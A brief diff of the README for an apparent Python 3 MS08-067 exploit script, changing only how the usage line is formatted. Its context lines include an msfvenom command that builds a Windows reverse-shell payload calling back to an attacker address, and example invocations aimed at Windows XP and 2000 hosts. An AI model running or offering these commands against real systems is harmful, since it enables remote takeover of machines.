@@ -33,7 +33,10 @@ msfvenom -p windows/shell_reverse_tcp LHOST=1.3.3.7 LPORT=62000 EXITFUNC=thread 
 ```
 ## Usage
 
-Usage: ms08_067_python3.py <target ip> <os #> <Port #>
+Usage: 
+```
+ms08_067_python3.py <target ip> <os #> <Port #>
+```
 
 * ms08_067_2018.py 192.168.1.1 1 445 -- for Windows XP SP0/SP1 Universal, port 445
 * ms08_067_2018.py 192.168.1.1 2 139 -- for Windows 2000 Universal, port 139 (445 could also be used)
